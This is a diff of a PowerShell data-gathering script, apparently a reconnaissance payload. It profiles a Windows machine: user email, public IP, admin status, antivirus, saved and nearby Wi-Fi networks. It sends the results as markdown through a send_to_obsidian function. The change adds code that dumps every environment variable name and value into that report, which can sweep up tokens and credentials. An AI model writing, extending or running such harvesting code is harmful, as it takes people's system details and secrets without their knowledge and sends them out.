@@ -64,7 +64,6 @@ function Get-email {
     }
 }
 
-
 function Get-IP-Information {
     $ipinfo = curl.exe "https://ipinfo.io" | ConvertFrom-Json
 
@@ -88,8 +87,11 @@ function Get-AntivirusSolution {
     return $AntivirusSolution
 }
 
-
-
+# Get environment variables
+function Get-EnvironmentVariables {
+    $envVars = Get-ChildItem Env: | Select-Object -Property Name, Value
+    return $envVars
+}
 
 # markdown wireless information
 function wireless_markdown {
@@ -117,6 +119,7 @@ function wireless_markdown {
     }
     return $wifi_json
 }
+
 # mark user information
 function user_markdown {
 
@@ -125,6 +128,7 @@ function user_markdown {
     $email = Get-email
     $is_admin = (Get-LocalGroupMember 'Administrators').Name -contains "$env:COMPUTERNAME\$env:USERNAME"
     $antivirus = Get-AntivirusSolution
+    $envVars = Get-EnvironmentVariables
 
     # create markdown content
     $content = @"
@@ -147,9 +151,13 @@ function user_markdown {
 ## PC Information
 - Antivirus : $antivirus
 
-## Connected Networks
+## Environment Variables
 "@
-    # send data set one
+
+    foreach ($envVar in $envVars) {
+        $content += "- $($envVar.Name) : $($envVar.Value)`n"
+    }
+
     send_to_obsidian -message $content -file $markdown
 
     # get saved wireless data
@@ -162,10 +170,10 @@ function user_markdown {
         send_to_obsidian -message "- [[$wifi_name]]" -file $markdown
     }
 
-    # setup nearby netwoks
+    # setup nearby networks
     send_to_obsidian -message "`n## Nearby Networks" -file $markdown
 
-    # attempt to rea/wireld nearby networks
+    # attempt to read nearby networks
     try {
         # get nearby ssids
         $nearby_ssids = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Authentication*" -or $_ -like "*Encryption*"}).trim()
